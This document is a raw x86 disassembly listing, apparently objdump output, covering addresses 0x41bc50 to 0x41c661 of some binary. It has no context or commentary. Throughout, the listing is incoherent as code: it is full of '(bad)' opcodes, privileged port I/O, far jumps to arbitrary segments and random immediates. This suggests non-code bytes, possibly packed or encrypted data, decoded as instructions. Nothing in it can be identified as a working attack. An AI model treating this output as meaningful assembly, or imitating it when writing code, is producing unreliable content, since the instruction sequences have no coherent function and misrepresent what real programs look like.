  41bc50:	fwait
  41bc51:	loope  0x41bc1b
  41bc53:	jecxz  0x41bbf3
  41bc55:	cmp    DWORD PTR [eax],eax
  41bc57:	pop    edi
  41bc58:	stos   BYTE PTR es:[edi],al
  41bc59:	fadd   QWORD PTR [eax]
  41bc5b:	clc    
  41bc5c:	clc    
  41bc5d:	fucomip st,st(0)
  41bc5f:	test   DWORD PTR [edi-0x48],edx
  41bc62:	xor    DWORD PTR [ecx-0x772e5950],ebx
  41bc68:	jb     0x41bce1
  41bc6a:	xor    BYTE PTR [ebx+0x6e],bl
  41bc6d:	(bad)  
  41bc6e:	sub    DWORD PTR [esi+0x44a87ff4],esi
  41bc74:	mov    ds:0xff63107e,al
  41bc79:	scas   al,BYTE PTR es:[edi]
  41bc7a:	sbb    bl,BYTE PTR [eax-0x6d3131b7]
  41bc80:	xchg   esi,eax
  41bc81:	dec    ebx
  41bc82:	cdq    
  41bc83:	inc    esi
  41bc84:	mov    bh,bh
  41bc86:	fucomp st(1)
  41bc88:	pushf  
  41bc89:	in     al,0x93
  41bc8b:	das    
  41bc8c:	shl    BYTE PTR [esi+eax*1+0x2522d265],cl
  41bc93:	in     eax,dx
  41bc94:	jae    0x41bcff
  41bc96:	pushf  
  41bc97:	ret    0xcc8
  41bc9a:	adc    edx,0xe33152b8
  41bca0:	mov    ebx,0x80700954
  41bca5:	xor    eax,0xaaa1a367
  41bcaa:	gs aad 0xfe
  41bcad:	test   al,0x1a
  41bcb0:	push   esp
  41bcb1:	mov    ds:0x180bb905,eax
  41bcb6:	scas   eax,DWORD PTR es:[edi]
  41bcb7:	jmp    0x41bc81
  41bcb9:	sbb    edi,edi
  41bcbb:	jl     0x41bcde
  41bcbd:	sbb    esp,edi
  41bcbf:	ficomp WORD PTR [ebx*4-0x5e453f8b]
  41bcc6:	(bad)  
  41bcc9:	xor    al,0xfc
  41bccb:	sbb    eax,0x60171528
  41bcd0:	push   esp
  41bcd1:	test   BYTE PTR [eax],bl
  41bcd3:	fucomi st,st(6)
  41bcd5:	sbb    ecx,DWORD PTR [ecx+0x63]
  41bcd8:	xlat   BYTE PTR ds:[ebx]
  41bcd9:	(bad)  
  41bcda:	fcomp  QWORD PTR [ebx]
  41bcdc:	mov    esi,0xfc351ad7
  41bce1:	pusha  
  41bce2:	mov    bl,0x9a
  41bce4:	sar    BYTE PTR [ebp-0x31b60a8a],cl
  41bcea:	push   ebp
  41bceb:	scas   eax,DWORD PTR es:[edi]
  41bcec:	push   ss
  41bced:	dec    ebx
	...
  41bd56:	shl    BYTE PTR [edx],cl
  41bd58:	cli    
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xab71d9d8
  41bd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd65:	sub    eax,DWORD PTR ds:[bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    cl,dh
  41bd6f:	cmp    eax,0xb0182eea
  41bd74:	int3   
  41bd75:	add    edx,DWORD PTR [ebp-0x1908824e]
  41bd7b:	clc    
  41bd7c:	or     DWORD PTR [ebx-0x64f39018],edi
  41bd82:	out    dx,al
  41bd83:	aad    0x20
  41bd85:	adc    DWORD PTR [edx-0x1],edx
  41bd88:	ror    BYTE PTR [ecx],0x55
  41bd8b:	repz aas 
  41bd8d:	mov    ds:0xad499906,al
  41bd92:	ja     0x41bd59
  41bd94:	adc    ebp,ebx
  41bd96:	sub    al,0x0
  41bd98:	push   ecx
  41bd99:	mov    eax,ds:0x5c0b6c82
  41bd9e:	leave  
  41bd9f:	lahf   
  41bda0:	not    ebx
  41bda2:	(bad)  [bx-0x13dd]
  41bda7:	(bad)  
  41bda8:	(bad)  [ebp-0x7502d336]
  41bdae:	sti    
  41bdaf:	pusha  
  41bdb0:	cwde   
  41bdb1:	mov    al,0xa2
  41bdb3:	call   FWORD PTR [edi-0x4d0d65b2]
  41bdb9:	sahf   
  41bdba:	mov    eax,0xdc0c9b84
  41bdbf:	ror    DWORD PTR [esi],0xbe
  41bdc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc3:	mov    eax,ds:0x9722824e
  41bdc8:	and    al,0xd2
  41bdca:	and    DWORD PTR [esi+0x3b7f5929],eax
  41bdd0:	mov    ds:0x7fd23c76,al
  41bdd5:	ins    BYTE PTR es:[edi],dx
  41bdd6:	aam    0xbb
  41bdd8:	test   BYTE PTR [eax+0x5c],ah
  41bddb:	mov    dh,BYTE PTR [ebp+0x5a1608ca]
  41bde1:	mov    ds:0xdfb52ac1,al
  41bde6:	sub    al,0x35
  41bde8:	xor    DWORD PTR [ecx],edx
  41bdea:	mov    DWORD PTR [eax+0x45b5716c],esp
  41bdf0:	test   DWORD PTR [esp+ebx*4],edi
  41bdf3:	jae    0x41bdfd
  41bdf5:	jno    0x41be40
  41bdf7:	pop    eax
  41bdf8:	jns    0x41be56
  41bdfa:	sti    
  41bdfb:	pop    esp
  41bdfc:	shl    DWORD PTR [eax],0xa3
  41bdff:	sub    ah,BYTE PTR ds:0x890f10a3
  41be05:	mov    ebp,0x9c88ac42
  41be0a:	in     eax,dx
  41be0b:	jb     0x41bd9c
  41be0d:	clc    
  41be0e:	push   esi
  41be0f:	js     0x41bdf4
  41be11:	(bad)  
  41be12:	ror    BYTE PTR [ebp-0x28],0x94
  41be16:	pop    edx
  41be17:	imul   esi,DWORD PTR [eax],0x6
  41be1a:	clc    
  41be1b:	mov    bh,bh
  41be1d:	je     0x41be22
  41be1f:	jae    0x41be1f
  41be21:	test   ah,0xa0
  41be24:	and    dl,ah
  41be26:	jp     0x41bdca
  41be28:	or     BYTE PTR ds:0x636e79ae,0xdc
  41be2f:	pop    ecx
  41be30:	inc    edx
  41be31:	ss clc 
  41be33:	cmc    
  41be34:	adc    al,0x79
  41be36:	xor    ch,BYTE PTR [edi+0x3109712b]
  41be3c:	arpl   bx,di
  41be3e:	xchg   dh,cl
  41be40:	out    dx,al
  41be41:	xchg   edx,eax
  41be42:	push   cs
  41be43:	fcom   DWORD PTR [esi]
  41be45:	fiadd  WORD PTR [ecx+ecx*8-0x716206b8]
  41be4c:	je     0x41bdfe
  41be4e:	arpl   sp,dx
  41be50:	and    eax,DWORD PTR [ecx-0x609779bf]
  41be56:	test   DWORD PTR [ebx+ecx*2],0x2dfdadd5
  41be5d:	lods   al,BYTE PTR ds:[esi]
  41be5e:	mov    dh,0xc3
  41be60:	into   
  41be61:	push   ss
  41be62:	jecxz  0x41bead
  41be64:	in     eax,0xda
  41be66:	dec    esi
  41be67:	cmp    cl,BYTE PTR [eax+0x20f83c84]
  41be6d:	jns    0x41be6f
	...
  41bed3:	add    BYTE PTR [eax],al
  41bed5:	add    BYTE PTR [ebp-0x63956373],al
  41bedb:	jnp    0x41bed4
  41bedd:	out    dx,eax
  41bede:	mov    ebp,DWORD PTR [ecx-0x6d13c09a]
  41bee4:	cmp    esp,esi
  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR ds:0x2c2c10ce,ch
  41bef3:	inc    esi
  41bef4:	xchg   ebx,eax
  41bef5:	ret    0x9e3d
  41bef8:	(bad)  
  41bef9:	call   0x295f2988
  41befe:	jno    0x41bf72
  41bf00:	mov    esi,0x1bdfb42b
  41bf05:	cld    
  41bf06:	test   edi,0xf9ac2ebb
  41bf0c:	pop    ebp
  41bf0d:	add    eax,DWORD PTR [esi-0x17570e36]
  41bf13:	and    al,0x2e
  41bf15:	ins    BYTE PTR es:[edi],dx
  41bf16:	xchg   esi,eax
  41bf17:	out    dx,eax
  41bf18:	xchg   dh,bh
  41bf1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf1b:	test   DWORD PTR [ecx-0x11],ecx
  41bf1e:	jae    0x41bf20
  41bf20:	xchg   esp,eax
  41bf21:	xchg   esi,eax
  41bf22:	fwait
  41bf23:	rcr    BYTE PTR [edi+0x6cebc428],1
  41bf29:	aas    
  41bf2a:	push   0x4c65c1f7
  41bf2f:	mov    ss,WORD PTR [eax-0x68]
  41bf32:	in     al,0x34
  41bf34:	fcomp  DWORD PTR [ebp+edx*8+0x4d]
  41bf38:	or     ebp,DWORD PTR [edi]
  41bf3a:	pop    ss
  41bf3b:	adc    DWORD PTR [ebx+0x2d],edi
  41bf3e:	jle    0x41bfb8
  41bf40:	dec    edx
  41bf41:	lahf   
  41bf42:	pop    ebx
  41bf43:	in     al,dx
  41bf44:	pop    ds
  41bf45:	aad    0x65
  41bf47:	sub    DWORD PTR [ebx],eax
  41bf49:	iret   
  41bf4a:	dec    edi
  41bf4b:	hlt    
  41bf4c:	pop    ss
  41bf4d:	lahf   
  41bf4e:	dec    edx
  41bf4f:	out    dx,al
  41bf50:	cs mov cl,0x78
  41bf53:	ins    BYTE PTR es:[edi],dx
  41bf54:	pop    ecx
  41bf55:	sahf   
  41bf56:	aas    
  41bf57:	lods   eax,DWORD PTR ds:[esi]
  41bf58:	sbb    dl,BYTE PTR [edi+0x20]
  41bf5b:	(bad)  
  41bf5c:	ins    BYTE PTR es:[edi],dx
  41bf5d:	pop    edi
  41bf5e:	jns    0x41bf27
  41bf60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf61:	pop    edx
  41bf62:	pop    esi
  41bf63:	idiv   DWORD PTR [edi-0x36]
  41bf66:	je     0x41bf08
  41bf68:	test   DWORD PTR [ecx+edi*8+0xb4e9522],ebx
  41bf6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf70:	fs push eax
  41bf72:	add    esi,DWORD PTR [ebx+eax*4+0x697ebde6]
  41bf79:	into   
  41bf7a:	mov    ebx,0x4064f38
  41bf7f:	in     eax,0x20
  41bf81:	lods   eax,DWORD PTR ds:[esi]
  41bf82:	sub    DWORD PTR [edx+0x5aaca7af],edi
  41bf88:	push   esp
  41bf89:	xchg   edi,edx
  41bf8b:	fcmovnu st,st(2)
  41bf8d:	push   edi
  41bf8e:	add    BYTE PTR [ebx-0x16],ch
  41bf91:	je     0x41bfcb
  41bf93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf94:	mov    esp,0x2d9912bb
  41bf99:	jmp    0x4cd1:0xb8d1285b
  41bfa0:	push   0x39bc1958
  41bfa5:	jg     0x41bfd7
  41bfa7:	scas   al,BYTE PTR es:[edi]
  41bfa8:	cmp    edi,esp
  41bfaa:	add    BYTE PTR [edx],0xfc
  41bfad:	add    eax,0x9dd00b90
  41bfb2:	cs into 
  41bfb4:	mov    DWORD PTR [edi],0xc00b9c4e
  41bfba:	or     DWORD PTR [ecx],ebx
  41bfbc:	lea    eax,[esi-0x1ecd24ad]
  41bfc2:	xor    al,0xea
  41bfc4:	sub    esp,edi
  41bfc6:	das    
  41bfc7:	pop    ss
  41bfc8:	fadd   QWORD PTR [ebp-0x3212ef49]
  41bfce:	sub    esp,DWORD PTR es:[ebx]
  41bfd1:	mov    cl,0x49
  41bfd3:	repz mov edx,0x3f3015e4
  41bfd9:	daa    
  41bfda:	pushf  
  41bfdb:	add    eax,0xc19b105b
  41bfe0:	iret   
  41bfe1:	(bad)  
  41bfe2:	add    eax,0x1adb1dff
  41bfe7:	sbb    eax,0x1f1a917f
  41bfec:	(bad)  [ebx+0x0]
	...
  41c053:	add    BYTE PTR [eax],al
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	push   0x61
  41c064:	jns    0x41c03a
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	inc    esp
  41c06f:	das    
  41c070:	push   ebp
  41c071:	add    esp,DWORD PTR [ebp+edi*2+0x2b]
  41c075:	or     esp,edx
  41c077:	sub    esi,DWORD PTR [eax+0x5a2d6584]
  41c07d:	(bad)  
  41c07e:	nop
  41c07f:	dec    BYTE PTR [ecx-0x7]
  41c082:	fisubr WORD PTR [ebx+0x3091135e]
  41c088:	popf   
  41c089:	daa    
  41c08a:	add    al,0x29
  41c08c:	(bad)  
  41c08d:	(bad)
  41c091:	popf   
  41c092:	pop    ebx
  41c093:	sub    bh,BYTE PTR [edx-0x34]
  41c096:	inc    esi
  41c097:	adc    ebp,DWORD PTR [eax*1-0x7d4e46e7]
  41c09e:	loop   0x41c112
  41c0a0:	cmp    bh,BYTE PTR [edi+0x5d7dc682]
  41c0a6:	jne    0x41c066
  41c0a8:	xor    dh,BYTE PTR [esi+0x40449f1f]
  41c0ae:	gs push edx
  41c0b0:	add    eax,0x6e2eea04
  41c0b5:	push   cx
  41c0b7:	and    cl,BYTE PTR [di-0x45]
  41c0bb:	jae    0x41c13b
  41c0bd:	xchg   edi,eax
  41c0be:	stos   DWORD PTR es:[edi],eax
  41c0bf:	add    esp,DWORD PTR [edi+ecx*4-0x26f6d093]
  41c0c6:	arpl   WORD PTR [bx+si],di
  41c0c9:	clc    
  41c0ca:	adc    ch,BYTE PTR [ebx-0x5b5e9aa2]
  41c0d0:	imul   esp,DWORD PTR [edx-0x47fcf2d6],0xa96d0f65
  41c0da:	loope  0x41c05c
  41c0dc:	pop    edi
  41c0dd:	rcr    DWORD PTR [edx-0x50dad1bc],0xf
  41c0e4:	mov    bl,0x46
  41c0e6:	inc    esi
  41c0e7:	pop    ecx
  41c0e8:	das    
  41c0e9:	stc    
  41c0ea:	es dec edx
  41c0ec:	cmp    eax,0xa2c1b9fc
  41c0f1:	rcl    eax,cl
  41c0f3:	mov    bh,0xf6
  41c0f5:	repnz cwde 
  41c0f7:	push   es
  41c0f8:	clc    
  41c0f9:	cmp    BYTE PTR [ecx],bl
  41c0fb:	inc    ebx
  41c0fc:	fs dec ebp
  41c0fe:	pop    eax
  41c0ff:	(bad)  
  41c100:	mov    esp,0x2234a671
  41c105:	sahf   
  41c106:	push   edi
  41c107:	scas   eax,DWORD PTR es:[edi]
  41c108:	push   esi
  41c109:	loop   0x41c147
  41c10b:	cmp    BYTE PTR [edi+0x192f5b17],ah
  41c111:	dec    eax
  41c112:	push   esp
  41c113:	mov    al,0xeb
  41c115:	push   0xffffffba
  41c117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c118:	ret    0x1ecf
  41c11b:	pop    eax
  41c11c:	fs and dl,ah
  41c11f:	push   ebx
  41c120:	sub    BYTE PTR [edi+0x2ba15902],0x80
  41c127:	aad    0x81
  41c129:	scas   al,BYTE PTR es:[edi]
  41c12a:	mov    ds:0x98644fee,al
  41c12f:	lods   eax,DWORD PTR ds:[esi]
  41c130:	sbb    al,0xea
  41c132:	fimul  DWORD PTR [esp+edx*1-0x5b791d17]
  41c139:	and    edx,DWORD PTR [ecx]
  41c13b:	in     al,dx
  41c13c:	in     al,dx
  41c13d:	pop    ebx
  41c13e:	lods   eax,DWORD PTR ds:[esi]
  41c13f:	test   DWORD PTR [edi-0x80],esi
  41c142:	scas   eax,DWORD PTR es:[edi]
  41c143:	mov    eax,0x9dcefb86
  41c148:	lea    eax,[ebp+0x7e4200bf]
  41c14e:	and    BYTE PTR [eax-0x80],dl
  41c151:	sbb    al,BYTE PTR [ebp+0x7dcb274b]
  41c157:	push   ebx
  41c158:	mov    bh,0x25
  41c15a:	call   0x9698:0xb0587967
  41c161:	setge  dl
  41c164:	sar    cl,1
  41c166:	sub    ch,BYTE PTR [edi+0x17c07dc0]
  41c16c:	pop    es
  41c16d:	outs   dx,BYTE PTR ds:[esi]
	...
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0x292ce3e9,eax
  41c1e5:	jo     0x41c24e
  41c1e7:	add    DWORD PTR cs:[eax],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	add    BYTE PTR [ebx-0x5b780fe9],dh
  41c1f4:	or     edi,DWORD PTR es:[esi]
  41c1f7:	aad    0x78
  41c1f9:	ret    0x28cd
  41c1fc:	pop    es
  41c1fd:	lods   al,BYTE PTR ds:[esi]
  41c1fe:	cmp    al,0x8f
  41c200:	and    ah,BYTE PTR [esi-0x2f11c2f0]
  41c206:	jmp    0x41c237
  41c208:	cmc    
  41c209:	or     DWORD PTR [edi-0x15],ecx
  41c20c:	xchg   edi,eax
  41c20d:	push   esi
  41c20e:	addr16 pop edx
  41c210:	inc    edi
  41c211:	arpl   WORD PTR [ebx-0x1ae9e0],di
  41c217:	pop    edi
  41c218:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c21a:	lds    ebp,FWORD PTR [eax-0x2cbaa4ff]
  41c220:	pop    dx
  41c222:	sub    bh,ch
  41c224:	mov    ah,0xc2
  41c226:	lods   al,BYTE PTR ds:[esi]
  41c227:	add    eax,0x524e7a8d
  41c22c:	add    al,0x6c
  41c22e:	push   esi
  41c22f:	mov    eax,ds:0xb389831c
  41c234:	mov    ds:0x5697a366,eax
  41c239:	jmp    0x3688:0xd939ece1
  41c240:	sbb    BYTE PTR [esi-0x1acc081b],ah
  41c246:	jnp    0x41c201
  41c248:	pushf  
  41c249:	in     al,dx
  41c24a:	call   0x2d33:0x4944b023
  41c251:	xsaveopt [edx+0x158c9255]
  41c258:	mov    ds:0xdd93ce6f,eax
  41c25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c25e:	ss dec ebp
  41c260:	shl    ebp,1
  41c262:	sub    edx,ebx
  41c264:	imul   ebp,DWORD PTR [esi],0xffffffcb
  41c267:	scas   eax,DWORD PTR es:[edi]
  41c268:	jmp    DWORD PTR [ebx]
  41c26a:	loop   0x41c2d7
  41c26c:	in     eax,dx
  41c26d:	dec    edx
  41c26e:	add    eax,eax
  41c270:	mov    ch,0x3e
  41c272:	aaa    
  41c273:	xor    BYTE PTR [edx+edx*1],cl
  41c276:	(bad)  
  41c277:	cmp    BYTE PTR [ebp+0x5cd0cc8b],cl
  41c27d:	adc    al,0x82
  41c27f:	scas   eax,DWORD PTR es:[edi]
  41c280:	jb     0x41c2a1
  41c282:	call   0x2351:0xbcd86062
  41c289:	inc    esp
  41c28a:	jle    0x41c29b
  41c28c:	pop    ss
  41c28d:	out    0x79,eax
  41c28f:	push   es
  41c290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c291:	add    BYTE PTR [esi+0x21c8887d],bh
  41c297:	adc    edx,DWORD PTR [ecx-0x65171d0d]
  41c29d:	add    BYTE PTR [eax+0x759a91c9],dh
  41c2a3:	or     ebp,esp
  41c2a5:	imul   edi,DWORD PTR [ecx+0x2f],0xffffff8c
  41c2a9:	test   eax,0x6e69906b
  41c2ae:	(bad)  
  41c2af:	out    dx,al
  41c2b0:	mov    edi,0x307f5e10
  41c2b5:	les    ebx,FWORD PTR [edi+edi*4+0x5a]
  41c2b9:	rol    DWORD PTR [esi],1
  41c2bb:	xchg   ebx,eax
  41c2bc:	icebp  
  41c2bd:	mov    ecx,0x3d09353e
  41c2c2:	neg    BYTE PTR [edx]
  41c2c4:	mov    eax,ds:0xc4c2cfef
  41c2c9:	imul   ebp,DWORD PTR [edx],0xffffff98
  41c2cc:	mov    ah,0x9c
  41c2ce:	inc    DWORD PTR [esi]
  41c2d0:	inc    ebx
  41c2d1:	je     0x41c32b
  41c2d3:	sti    
  41c2d4:	adc    al,0x0
  41c2d6:	mov    ebx,0x143479a0
  41c2db:	cmp    DWORD PTR [eax+ebp*1-0x4c],ebp
  41c2df:	sbb    esp,0xf6131d58
  41c2e5:	push   eax
  41c2e6:	js     0x41c352
  41c2e8:	retf   
  41c2e9:	mov    edi,ebx
  41c2eb:	mov    edx,0x430a
	...
  41c354:	add    BYTE PTR [eax],al
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	pop    es
  41c363:	nop
  41c364:	push   eax
  41c365:	dec    edi
  41c366:	addr16 das 
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	jp     0x41c3c2
  41c370:	shl    BYTE PTR [ebx-0x45],cl
  41c373:	xchg   BYTE PTR ss:[ebx-0x7e7a56c0],dh
  41c37a:	dec    eax
  41c37b:	addr16 cld 
  41c37d:	pop    ds
  41c37e:	out    0x73,eax
  41c380:	xchg   edi,eax
  41c381:	retf   
  41c382:	jge    0x41c367
  41c384:	mov    al,0xdf
  41c386:	mov    ds:0xbef341ea,eax
  41c38b:	mov    dl,0x7c
  41c38d:	std    
  41c38e:	jg     0x41c34b
  41c390:	pop    edi
  41c391:	retf   0x4548
  41c394:	idiv   BYTE PTR [edx+0x71]
  41c397:	push   edx
  41c398:	dec    edx
  41c399:	popf   
  41c39a:	cli    
  41c39b:	leave  
  41c39c:	xchg   ebp,eax
  41c39d:	js     0x41c380
  41c39f:	cmp    dl,BYTE PTR [ebx+0x25fda6ef]
  41c3a5:	loope  0x41c385
  41c3a7:	call   FWORD PTR [edi+esi*8+0x18b242f4]
  41c3ae:	(bad)  
  41c3af:	cld    
  41c3b0:	fsub   QWORD PTR [esi-0x294d55c4]
  41c3b6:	adc    BYTE PTR [esi+0x7],0x3b
  41c3ba:	dec    ebp
  41c3bb:	sbb    dl,BYTE PTR [ebp-0x78]
  41c3be:	outs   dx,DWORD PTR ds:[esi]
  41c3bf:	rcl    DWORD PTR [eax-0x45633d3],1
  41c3c5:	inc    edx
  41c3c6:	pop    ebx
  41c3c7:	push   ds
  41c3c8:	pop    esi
  41c3c9:	loop   0x41c3e0
  41c3cb:	dec    edx
  41c3cc:	mov    al,ds:0x8eeea7f0
  41c3d1:	(bad)  [edi+ebp*1]
  41c3d4:	cmc    
  41c3d5:	std    
  41c3d6:	fisub  DWORD PTR [eax]
  41c3d8:	les    edi,FWORD PTR [ecx+0x2321ebe7]
  41c3de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3df:	pop    ds
  41c3e0:	dec    esp
  41c3e1:	clc    
  41c3e2:	jae    0x41c424
  41c3e4:	xor    ecx,edi
  41c3e6:	push   eax
  41c3e7:	mov    cl,0x6e
  41c3e9:	or     al,0x55
  41c3eb:	mov    edi,0xc1a566c1
  41c3f0:	mov    ds:0x7dedf31,eax
  41c3f5:	lds    eax,FWORD PTR [ebx-0x1b]
  41c3f8:	out    0x35,al
  41c3fa:	cmp    eax,0x1827eef1
  41c3ff:	push   esi
  41c400:	jl     0x41c436
  41c402:	and    BYTE PTR [ebx+0x554cb707],cl
  41c408:	sub    BYTE PTR [eax-0x48],al
  41c40b:	jl     0x41c406
  41c40d:	(bad)  
  41c40e:	clc    
  41c40f:	add    edi,DWORD PTR [ecx+0x27ca2c27]
  41c415:	lahf   
  41c416:	push   esp
  41c417:	gs pusha 
  41c419:	cld    
  41c41a:	sub    bl,BYTE PTR [edx+eiz*2-0x68c3ed6a]
  41c421:	out    dx,al
  41c422:	dec    ebp
  41c423:	jnp    0x41c3f5
  41c425:	and    eax,0x7c3cf4d2
  41c42a:	bound  ebp,QWORD PTR [edi-0x71]
  41c42d:	fild   WORD PTR [edi+0x1bb7bbc6]
  41c433:	mov    bh,0x4d
  41c435:	jle    0x41c485
  41c437:	pop    es
  41c438:	(bad)  
  41c439:	imul   eax,DWORD PTR [ebx],0x3d
  41c43c:	div    DWORD PTR [ebp+0x747bb4ef]
  41c442:	mov    cl,0x72
  41c444:	jmp    0xe2776db0
  41c449:	add    al,BYTE PTR [edx+0x1d]
  41c44c:	lods   al,BYTE PTR ds:[esi]
  41c44d:	add    DWORD PTR [edi-0x68],ebx
  41c450:	leave  
  41c451:	and    edx,DWORD PTR [ebp+0x58cc7334]
  41c457:	xchg   edx,eax
  41c458:	pop    ebp
  41c459:	push   0x48
  41c45b:	out    dx,eax
  41c45c:	loopne 0x41c484
  41c45e:	mov    ch,0x3c
  41c460:	dec    esp
  41c461:	push   cs
  41c462:	sub    eax,0x2a6c0c99
  41c467:	xchg   ecx,eax
  41c468:	push   ebp
  41c469:	sub    BYTE PTR [edi],bl
  41c46b:	inc    ebx
  41c46c:	loop   0x41c496
	...
  41c4d6:	push   ebx
  41c4d7:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	fsubr  DWORD PTR [ecx+0x3067ccb8]
  41c4e8:	add    DWORD PTR [eax],eax
  41c4ea:	add    BYTE PTR [ecx],al
  41c4ec:	add    BYTE PTR [eax],al
  41c4ee:	dec    esp
  41c4ef:	mov    edx,0x43920268
  41c4f4:	popf   
  41c4f5:	dec    ecx
  41c4f6:	push   eax
  41c4f7:	std    
  41c4f8:	xchg   esp,eax
  41c4f9:	das    
  41c4fa:	ret    0xe830
  41c4fd:	repz add ecx,DWORD PTR [eax-0x7a]
  41c501:	addr16 jne 0x41c4ab
  41c504:	push   ss
  41c505:	mov    edi,0x709f41dd
  41c50a:	jl     0x41c55f
  41c50c:	xor    DWORD PTR [ebp+eax*8+0x2f],ebp
  41c510:	adc    BYTE PTR [ebx-0x37],al
  41c513:	out    dx,eax
  41c514:	(bad)  
  41c515:	xlat   BYTE PTR ds:[ebx]
  41c516:	int    0x95
  41c518:	push   edx
  41c519:	pop    ebx
  41c51a:	pop    es
  41c51b:	push   esi
  41c51c:	add    ebp,DWORD PTR [edi-0x71]
  41c51f:	call   0xa1d8ffc3
  41c524:	icebp  
  41c525:	in     al,0xca
  41c527:	or     bh,dh
  41c529:	addr16 sbb al,0x30
  41c52c:	ret    0x4d7d
  41c52f:	neg    BYTE PTR [ebx-0x16]
  41c532:	jecxz  0x41c4c0
  41c534:	fucomp st(5)
  41c536:	push   ds
  41c537:	xchg   ebx,eax
  41c538:	sub    cl,bh
  41c53a:	push   ss
  41c53b:	or     esp,DWORD PTR [edi]
  41c53d:	arpl   WORD PTR [ebx-0x3a7576a7],bp
  41c543:	jle    0x41c568
  41c545:	jp     0x41c4cb
  41c547:	adc    BYTE PTR [eax+ecx*2],al
  41c54a:	fsub   QWORD PTR [ecx+eax*8]
  41c54d:	xchg   ecx,eax
  41c54e:	push   cs
  41c54f:	scas   eax,DWORD PTR es:[edi]
  41c550:	push   esp
  41c551:	pop    ecx
  41c552:	mov    eax,ebp
  41c554:	aam    0xa6
  41c556:	dec    ebp
  41c557:	inc    esp
  41c558:	cmc    
  41c559:	iret   
  41c55a:	mov    ecx,DWORD PTR [eax+edx*4-0x512af2b5]
  41c561:	pusha  
  41c562:	imul   ecx,DWORD PTR [esp+ebx*8],0x39
  41c566:	inc    esp
  41c567:	mov    eax,0x1a8a0752
  41c56c:	push   0xe44db3ad
  41c571:	mov    ah,0xe1
  41c573:	(bad)  
  41c574:	not    DWORD PTR [ebx-0x374ac7d3]
  41c57a:	and    bh,BYTE PTR [ebx]
  41c57c:	test   DWORD PTR [edi-0x5fcb0de6],esp
  41c582:	push   esp
  41c583:	push   0x57
  41c585:	push   ds
  41c586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c587:	stc    
  41c588:	out    dx,al
  41c589:	inc    edi
  41c58a:	stos   DWORD PTR es:[edi],eax
  41c58b:	ds fsubp st(6),st
  41c58e:	mov    cl,0x8b
  41c590:	lods   al,BYTE PTR ds:[esi]
  41c591:	(bad)  
  41c592:	shl    BYTE PTR [edi+0x75],cl
  41c595:	(bad)  
  41c596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c597:	or     edi,DWORD PTR [eax+0x4f6b8dcc]
  41c59d:	outs   dx,DWORD PTR ds:[esi]
  41c59e:	inc    ecx
  41c59f:	int    0xb9
  41c5a1:	std    
  41c5a2:	push   ebp
  41c5a3:	jge    0x41c5cc
  41c5a5:	enter  0x397,0x2
  41c5a9:	test   DWORD PTR [eax],esp
  41c5ab:	fisubr WORD PTR [edx+0x61efbe7]
  41c5b1:	daa    
  41c5b2:	cmp    eax,0x688f6666
  41c5b7:	rcr    BYTE PTR [ebx-0x43],1
  41c5ba:	cmc    
  41c5bb:	fdivr  st,st(2)
  41c5bd:	retf   
  41c5be:	push   edi
  41c5bf:	dec    esp
  41c5c0:	push   esp
  41c5c1:	sub    ah,BYTE PTR [esi+0xc]
  41c5c4:	arpl   WORD PTR [edx],dx
  41c5c6:	loopne 0x41c563
  41c5c8:	inc    ebx
  41c5c9:	cld    
  41c5ca:	mov    ah,0x3f
  41c5cc:	dec    BYTE PTR [esi]
  41c5ce:	lea    ebx,[edx-0x148c75a6]
  41c5d4:	sbb    eax,0xe585da1f
  41c5d9:	in     eax,dx
  41c5da:	cdq    
  41c5db:	xor    esi,DWORD PTR [edi+0x1a847e44]
  41c5e1:	fmulp  st(5),st
  41c5e3:	outs   dx,BYTE PTR ds:[esi]
  41c5e4:	mov    WORD PTR [eax],fs
  41c5e6:	push   0x2b
  41c5e8:	mov    eax,0xe0f892de
  41c5ed:	jns    0x41c5ef
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xddf0053d
